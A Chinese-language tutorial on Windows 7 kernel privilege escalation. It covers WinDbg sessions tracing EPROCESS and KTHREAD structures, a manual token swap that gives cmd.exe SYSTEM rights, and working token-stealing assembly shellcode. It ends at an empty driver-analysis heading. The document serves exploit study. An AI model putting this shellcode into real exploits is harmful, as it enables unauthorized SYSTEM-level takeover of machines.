# UAF漏洞

## 提权示例

在Win7虚拟机中用普通用户打开一个cmd然后断下来，查看当前进程的信息

```
3: kd> !dml_proc
Address  PID  Image file name
86a157c8 4    System         
881a38d8 124  smss.exe       
882abc48 17c  csrss.exe      
892361d0 1b0  wininit.exe    
87dfbb60 1bc  csrss.exe      
88cdfa68 1f4  services.exe   
88cf23f0 214  winlogon.exe   
...... 
86b489b8 860  OSRLOADER.exe  
890d99e0 bcc  cmd.exe        
88e63030 d1c  conhost.exe    

```

可以看到System进程（pid为4）的地址是0x86a157c8，cmd的地址是0x890d99e0，查看地址中的成员信息。注意token的位置是在进程偏移0xf8的位置（这个数据结构在ntdll.dll里面应该能找到）。我们将进程的token修改为系统的token，就可以提权成功。

```
3: kd> dt nt!_EX_FAST_REF 86a157c8+f8 
   +0x000 Object           : 0x8d401276 Void
   +0x000 RefCnt           : 0y110
   +0x000 Value            : 0x8d401276 // system token
3: kd> dt nt!_EX_FAST_REF 890d99e0+f8
   +0x000 Object           : 0x83b07562 Void
   +0x000 RefCnt           : 0y010
   +0x000 Value            : 0x83b07562 // cmd token

```

我们用ed命令修改cmd token的值为system token

```
3: kd> ed 890d99e0+f8 0x8d401276
3: kd> dt nt!_EX_FAST_REF 890d99e0+f8
   +0x000 Object           : 0x8d401276 Void
   +0x000 RefCnt           : 0y110
   +0x000 Value            : 0x8d401276
```

用whoami命令查看权限，发现已经变为系统权限。

![image-20200514192810869](C:\Users\liwc1\AppData\Roaming\Typora\typora-user-images\image-20200514192810869.png)

## 线程 & 进程的数据结构与提权shellcode

用windbg的dg指令查看段描述符：

```
3: kd> r fs
fs=00000030
3: kd> dg 30
                                  P Si Gr Pr Lo
Sel    Base     Limit     Type    l ze an es ng Flags
---- -------- -------- ---------- - -- -- -- -- --------
0030 8fd40000 00003748 Data RW Ac 0 Bg By P  Nl 00000493

```

所以ring0下FS指向的是0x8fd40000，而这个地址是什么呢，看一些KPCR结构的信息

```
3: kd> !pcr
KPCR for Processor 3 at 8fd40000:
    Major 1 Minor 1
	NtTib.ExceptionList: 8fd5c10c
	    NtTib.StackBase: 00000000
	   NtTib.StackLimit: 00000000
	 NtTib.SubSystemTib: 8fd43750
	      NtTib.Version: 000d0e69
	  NtTib.UserPointer: 00000008
	      NtTib.SelfTib: 00000000

	            SelfPcr: 8fd40000
	               Prcb: 8fd40120
	               Irql: 0000001f
	                IRR: 00000000
	                IDR: ffffffff
	      InterruptMode: 00000000
	                IDT: 8fd49020
	                GDT: 8fd48c20
	                TSS: 8fd43750

	      CurrentThread: 8fd45800
	         NextThread: 882a8020
	         IdleThread: 8fd45800

	          DpcQueue: 

```

KPCR结构体的结构如下

```
3: kd> dt nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Used_StackBase   : Ptr32 Void
   +0x008 Spare2           : Ptr32 Void
   +0x00c TssCopy          : Ptr32 Void
   +0x010 ContextSwitches  : Uint4B
   +0x014 SetMemberCopy    : Uint4B
   +0x018 Used_Self        : Ptr32 Void
   +0x01c SelfPcr          : Ptr32 _KPCR
   +0x020 Prcb             : Ptr32 _KPRCB
   +0x024 Irql             : UChar
   +0x028 IRR              : Uint4B
   +0x02c IrrActive        : Uint4B
   +0x030 IDR              : Uint4B
   +0x034 KdVersionBlock   : Ptr32 Void
   +0x038 IDT              : Ptr32 _KIDTENTRY
   +0x03c GDT              : Ptr32 _KGDTENTRY
   +0x040 TSS              : Ptr32 _KTSS
   +0x044 MajorVersion     : Uint2B
   +0x046 MinorVersion     : Uint2B
   +0x048 SetMember        : Uint4B
   +0x04c StallScaleFactor : Uint4B
   +0x050 SpareUnused      : UChar
   +0x051 Number           : UChar
   +0x052 Spare0           : UChar
   +0x053 SecondLevelCacheAssociativity : UChar
   +0x054 VdmAlert         : Uint4B
   +0x058 KernelReserved   : [14] Uint4B
   +0x090 SecondLevelCacheSize : Uint4B
   +0x094 HalReserved      : [16] Uint4B
   +0x0d4 InterruptMode    : Uint4B
   +0x0d8 Spare1           : UChar
   +0x0dc KernelReserved2  : [17] Uint4B
   +0x120 PrcbData         : _KPRCB

```

因为Windows需要支持多个CPU，因此Windows内核中为此定义了一套处理器控制区（Processor Control Region），即KPCR为枢纽的数据结构，使每个CPU都有个KPCR。其中KPCR这个结构有一个field KPCRB（Kernel Processor Control Block）结构，这个结构扩展了KPCR，这两个结构用来保存与线程切换相关的全局信息。

再看一下KPRCB的内容

```
3: kd> dt nt!_KPRCB
   +0x000 MinorVersion     : Uint2B
   +0x002 MajorVersion     : Uint2B
   +0x004 CurrentThread    : Ptr32 _KTHREAD
   +0x008 NextThread       : Ptr32 _KTHREAD
   +0x00c IdleThread       : Ptr32 _KTHREAD
   ......	
```

所以fs:[124h]即指向`_KTHREAD`类型的CurrentThread变量，结合WRK代码在/base/ntos/inc/i386.h下也可以找到`_KPCR`和`_KPRCB`的代码。

再看一下`_KTHREAD`结构:

```
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 ((ntkrpamp!_KTHREAD *)0x8fd45800)
((ntkrpamp!_KTHREAD *)0x8fd45800)                 : 0x8fd45800 [Type: _KTHREAD *]
    [+0x000] Header           [Type: _DISPATCHER_HEADER]
    [+0x010] CycleTime        : 0x683c543bb7a [Type: unsigned __int64]
    [+0x018] HighCycleTime    : 0x683 [Type: unsigned long]
    [+0x020] QuantumTarget    : 0x15accf23bc [Type: unsigned __int64]
    [+0x028] InitialStack     : 0x8fd5ced0 [Type: void *]
    [+0x02c] StackLimit       : 0x8fd5a000 [Type: void *]
    [+0x030] KernelStack      : 0x8fd5cc1c [Type: void *]
    [+0x034] ThreadLock       : 0x0 [Type: unsigned long]
    [+0x038] WaitRegister     [Type: _KWAIT_STATUS_REGISTER]
    [+0x039] Running          : 0x1 [Type: unsigned char]
    [+0x03a] Alerted          [Type: unsigned char [2]]
    [+0x03c ( 0: 0)] KernelStackResident : 0x1 [Type: unsigned long]
    [+0x03c ( 1: 1)] ReadyTransition  : 0x0 [Type: unsigned long]
    [+0x03c ( 2: 2)] ProcessReadyQueue : 0x0 [Type: unsigned long]
    [+0x03c ( 3: 3)] WaitNext         : 0x0 [Type: unsigned long]
    [+0x03c ( 4: 4)] SystemAffinityActive : 0x0 [Type: unsigned long]
    [+0x03c ( 5: 5)] Alertable        : 0x0 [Type: unsigned long]
    [+0x03c ( 6: 6)] GdiFlushActive   : 0x0 [Type: unsigned long]
    [+0x03c ( 7: 7)] UserStackWalkActive : 0x0 [Type: unsigned long]
    [+0x03c ( 8: 8)] ApcInterruptRequest : 0x0 [Type: unsigned long]
    [+0x03c ( 9: 9)] ForceDeferSchedule : 0x0 [Type: unsigned long]
    [+0x03c (10:10)] QuantumEndMigrate : 0x0 [Type: unsigned long]
    [+0x03c (11:11)] UmsDirectedSwitchEnable : 0x0 [Type: unsigned long]
    [+0x03c (12:12)] TimerActive      : 0x0 [Type: unsigned long]
    [+0x03c (13:13)] SystemThread     : 0x1 [Type: unsigned long]
    [+0x03c (31:14)] Reserved         : 0x0 [Type: unsigned long]
    [+0x03c] MiscFlags        : 8193 [Type: long]
    [+0x040] ApcState         [Type: _KAPC_STATE]
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 (*((ntkrpamp!_KAPC_STATE *)0x8fd45840))
(*((ntkrpamp!_KAPC_STATE *)0x8fd45840))                 [Type: _KAPC_STATE]
    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]
    [+0x010] Process          : 0x86a157c8 [Type: _KPROCESS *]
    [+0x014] KernelApcInProgress : 0x0 [Type: unsigned char]
    [+0x015] KernelApcPending : 0x0 [Type: unsigned char]
    [+0x016] UserApcPending   : 0x0 [Type: unsigned char]

```

所以0x40+0x10=0x50处是`_KPROCESS`类型的成员变量Process，而实际上`_KPROCESS`是嵌套在`EPROCESS`结构体中的，查询WRK代码可知，`_EPROCESS`结构体的偏移0x00处为`KPROCESS`类型的pcb（进程控制块），所以`_KTHREAD`的0x50偏移处为对应的`_EPROCESS`结构体，而这个结构体中还存储了进程的uid。

```c++
// Process structure.
//
// If you remove a field from this structure, please also
// remove the reference to it from within the kernel debugger
// (nt\private\sdktools\ntsd\ntkext.c)
//

typedef struct _EPROCESS {
    KPROCESS Pcb;

    //
    // Lock used to protect:
    // The list of threads in the process.
    // Process token.
    // Win32 process field.
    // Process and thread affinity setting.
    //

    EX_PUSH_LOCK ProcessLock;

    LARGE_INTEGER CreateTime;
    LARGE_INTEGER ExitTime;

    //
    // Structure to allow lock free cross process access to the process
    // handle table, process section and address space. Acquire rundown
    // protection with this if you do cross process handle table, process
    // section or address space references.
    //

    EX_RUNDOWN_REF RundownProtect;

    HANDLE UniqueProcessId;
    
	//
    // Global list of all processes in the system. Processes are removed
    // from this list in the object deletion routine.  References to
    // processes in this list must be done with ObReferenceObjectSafe
    // because of this.
    //

    LIST_ENTRY ActiveProcessLinks; //此链表是存储系统中所有进程的全局链表
```

windbg调试`_EPROCESS`结构体如下：

```
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 ((ntkrpamp!_EPROCESS *)0x86a157c8)
((ntkrpamp!_EPROCESS *)0x86a157c8)                 : 0x86a157c8 [Type: _EPROCESS *]
    [+0x000] Pcb              [Type: _KPROCESS]
    [+0x098] ProcessLock      [Type: _EX_PUSH_LOCK]
    [+0x0a0] CreateTime       : {132339167456696196} [Type: _LARGE_INTEGER]
    [+0x0a8] ExitTime         : {0} [Type: _LARGE_INTEGER]
    [+0x0b0] RundownProtect   [Type: _EX_RUNDOWN_REF]
    [+0x0b4] UniqueProcessId  : 0x4 [Type: void *] // System进程的uid为0x4
    [+0x0b8] ActiveProcessLinks [Type: _LIST_ENTRY] 

```

这里的`ActiveProcessLinks`如前述WRK代码所说，是系统内所有进程的全局列表，调试可知:

```
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 (*((ntkrpamp!_LIST_ENTRY *)0x86a15880))
(*((ntkrpamp!_LIST_ENTRY *)0x86a15880))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0x881a3990 [Type: _LIST_ENTRY *]
    [+0x004] Blink            : 0x83f89f18 [Type: _LIST_ENTRY *]

```

此双向链表指向的前一个进程的`_LIST_ENTRY`地址为0x881a3990，而这个进程的uid为124，即为`smss.exe `

```
3: kd> dt nt!_EPROCESS 0x881a3990-0xb8
   +0x000 Pcb              : _KPROCESS
   +0x098 ProcessLock      : _EX_PUSH_LOCK
   +0x0a0 CreateTime       : _LARGE_INTEGER 0x01d629c5`8a27bba5
   +0x0a8 ExitTime         : _LARGE_INTEGER 0x0
   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
   +0x0b4 UniqueProcessId  : 0x00000124 Void
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x882abd00 - 0x86a15880 ]

```

所以，我们可以写出遍历ActiveProcessLinks链表找到System进程并复制token的shellcode如下:

```c++
void Shellcode()
{
	_asm
	{
		nop
		nop
		nop
		nop
		pushad
		mov eax,fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50] 	// 找到_PROCESS&_EPROCESS结构
		mov ecx, eax 			// ecx为当前线程
		mov edx, 4

		// 循环获取system的_EPROCESS
	find_sys_pid:
		mov eax, [eax+0xb8]		// 找到ActiveProcessLinks
		sub eax, 0xb8			// FLINK
		cmp [eax + 0xb4], edx	// 与uid = 4比较
		jnz find_sys_pid

		// 替换Token
		mov edx, [eax+0xf8]
		mov [ecx + 0xf8], edx
		popad
		ret
	}
}
```

## 漏洞驱动代码分析







































